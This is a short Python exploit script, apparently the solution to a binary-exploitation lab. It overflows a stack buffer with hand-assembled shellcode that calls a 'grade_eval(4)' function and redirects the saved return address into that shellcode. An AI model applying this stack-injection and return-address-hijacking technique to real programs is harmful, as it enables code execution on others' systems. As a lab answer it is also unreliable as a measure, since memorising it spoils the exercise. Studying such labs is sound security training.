#!/usr/bin/env python3
import struct
import sys

BUFFER_ADDR = 0x721000800FD0  # input() 的 expression: rbp(0x721000800fe0) - 0x10
GRADE_EVAL = 0x401A87
EXIT_PLT = 0x401880           # grade_eval 返回后弹栈取出, 干净退出


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


# 把调用 grade_eval(4) 的机器码写进栈上的 expression,
# 再把返回地址指回缓冲区开头, 让 CPU 直接在栈上取指执行.
shellcode = b"".join([
    b"\x6a\x04",                              # push 4
    b"\x5f",                                  # pop rdi, 作为 grade_eval 的参数
    b"\xb8" + struct.pack("<I", GRADE_EVAL),  # mov eax, grade_eval
    b"\xff\xd0",                              # call rax, 栈保持 16 字节对齐
    b"\xc3",                                  # ret, 弹出紧随 saved rip 的 exit@plt
    b"\x90" * 5,                              # 填充, 凑满 16 字节
])
assert len(shellcode) == 16

payload  = shellcode              # 返回地址指回缓冲区开头
payload += b"C" * 8               # saved rbp
payload += p64(BUFFER_ADDR)       # saved rip = 栈上 shellcode
payload += p64(EXIT_PLT)          # shellcode 最后那条 ret 的落点
payload += b"\n"
sys.stdout.buffer.write(payload)
